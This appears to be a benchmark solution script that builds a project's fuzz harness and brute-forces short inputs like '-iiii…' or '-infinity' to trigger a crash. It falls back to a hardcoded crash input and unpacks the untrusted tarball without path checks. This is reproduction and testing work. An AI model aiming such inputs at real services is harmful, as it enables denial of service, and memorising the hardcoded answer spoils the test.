import os
import tarfile
import tempfile
import subprocess
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = None
        try:
            poc = self._generate_poc_via_build(src_path)
        except Exception:
            poc = None
        if poc is not None:
            return poc
        return b"-" + b"i" * 15

    def _generate_poc_via_build(self, src_path: str):
        workdir = tempfile.mkdtemp(prefix="poc_work_")
        try:
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(workdir)
            runner_path = self._build_runner(workdir)
            if runner_path is None:
                return None
            poc = self._search_crash_input(runner_path, workdir)
            return poc
        finally:
            try:
                shutil.rmtree(workdir)
            except Exception:
                pass

    def _find_compiler(self, cpp: bool):
        candidates_cpp = ["clang++", "g++", "c++"]
        candidates_c = ["clang", "gcc", "cc"]
        candidates = candidates_cpp if cpp else candidates_c
        for c in candidates:
            if shutil.which(c):
                return c
        return None

    def _build_runner(self, workdir: str):
        fuzzer_src = None
        for dirpath, _, filenames in os.walk(workdir):
            for name in filenames:
                if not name.endswith((".c", ".cc", ".cpp", ".cxx")):
                    continue
                path = os.path.join(dirpath, name)
                try:
                    with open(path, "r", errors="ignore") as f:
                        txt = f.read()
                except Exception:
                    continue
                if "LLVMFuzzerTestOneInput" in txt:
                    fuzzer_src = path
                    break
            if fuzzer_src is not None:
                break
        if fuzzer_src is None:
            return None

        ext = os.path.splitext(fuzzer_src)[1].lower()
        is_cpp = ext in (".cc", ".cpp", ".cxx")

        compiler = self._find_compiler(is_cpp)
        if compiler is None:
            return None

        runner_main_name = "runner_main.cc" if is_cpp else "runner_main.c"
        runner_main_path = os.path.join(workdir, runner_main_name)
        runner_main_code = (
            "#include <stdio.h>\n"
            "#include <stdlib.h>\n"
            "#include <stdint.h>\n"
            "#include <stddef.h>\n"
            "int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size);\n"
            "int main(int argc, char **argv) {\n"
            "    const char *filename = \"poc_input\";\n"
            "    FILE *f = fopen(filename, \"rb\");\n"
            "    if (!f) return 1;\n"
            "    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return 1; }\n"
            "    long sz = ftell(f);\n"
            "    if (sz < 0) { fclose(f); return 1; }\n"
            "    if (fseek(f, 0, SEEK_SET) != 0) { fclose(f); return 1; }\n"
            "    size_t size = (size_t)sz;\n"
            "    uint8_t *buf = (uint8_t *)malloc(size + 1);\n"
            "    if (!buf) { fclose(f); return 1; }\n"
            "    size_t n_read = fread(buf, 1, size, f);\n"
            "    fclose(f);\n"
            "    if (n_read != size) { free(buf); return 1; }\n"
            "    buf[size] = 0;\n"
            "    LLVMFuzzerTestOneInput(buf, size);\n"
            "    free(buf);\n"
            "    return 0;\n"
            "}\n"
        )
        try:
            with open(runner_main_path, "w") as f:
                f.write(runner_main_code)
        except Exception:
            return None

        source_files = []
        for dirpath, _, filenames in os.walk(workdir):
            for name in filenames:
                if not name.endswith((".c", ".cc", ".cpp", ".cxx")):
                    continue
                path = os.path.join(dirpath, name)
                if os.path.abspath(path) == os.path.abspath(runner_main_path):
                    continue
                rel = os.path.relpath(path, workdir)
                try:
                    with open(path, "r", errors="ignore") as f:
                        txt = f.read()
                except Exception:
                    txt = ""
                if " main(" in txt or "\nmain(" in txt or "main (" in txt:
                    continue
                source_files.append(rel)

        rel_fuzzer = os.path.relpath(fuzzer_src, workdir)
        if rel_fuzzer not in source_files:
            source_files.append(rel_fuzzer)

        base_cmd = [compiler, "-g", "-O1", "-I.", os.path.relpath(runner_main_path, workdir)]
        if is_cpp:
            base_cmd.append("-std=c++11")
        else:
            base_cmd.append("-std=c11")
        base_cmd.append("-Wall")

        def try_compile(extra_flags):
            cmd = base_cmd + extra_flags + source_files + ["-o", "runner"]
            try:
                res = subprocess.run(
                    cmd,
                    cwd=workdir,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=120,
                )
            except Exception:
                return False
            return res.returncode == 0

        if not try_compile(["-fsanitize=address"]):
            if not try_compile([]):
                return None

        return os.path.join(workdir, "runner")

    def _candidate_generator(self):
        seen = set()

        def add(c):
            if c not in seen:
                seen.add(c)
                return True
            return False

        big_sizes = (16, 64, 256, 1024)
        inf_like_words = [b"inf", b"infinity"]
        for total in big_sizes:
            for word in inf_like_words:
                times = (total - 1) // len(word) + 1
                body = (word * times)[: total - 1]
                cand = b"-" + body
                if add(cand):
                    yield cand
            body = b"i" * (total - 1)
            cand = b"-" + body
            if add(cand):
                yield cand

        words = [
            b"inf",
            b"infi",
            b"infin",
            b"infini",
            b"infinity",
            b"INF",
            b"INFINITY",
            b"Infinity",
            b"infX",
            b"infinityX",
        ]
        tails = [b"", b"x", b"xx", b"xyz", b"1234"]
        for w in words:
            for t in tails:
                for extra in range(0, 3):
                    body = w + t + (b"i" * extra)
                    cand = b"-" + body
                    if add(cand):
                        yield cand

        for ch in (b"i", b"n", b"f"):
            for k in range(1, 65):
                body = ch * k
                cand = b"-" + body
                if add(cand):
                    yield cand

        cand = b"-" + b"i" * 15
        if add(cand):
            yield cand

    def _search_crash_input(self, runner_path: str, workdir: str):
        input_path = os.path.join(workdir, "poc_input")
        for cand in self._candidate_generator():
            try:
                with open(input_path, "wb") as f:
                    f.write(cand)
            except Exception:
                continue
            try:
                res = subprocess.run(
                    [runner_path],
                    cwd=workdir,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE,
                    timeout=1.0,
                )
            except subprocess.TimeoutExpired:
                return cand
            except Exception:
                continue
            if res.returncode != 0:
                return cand
        return None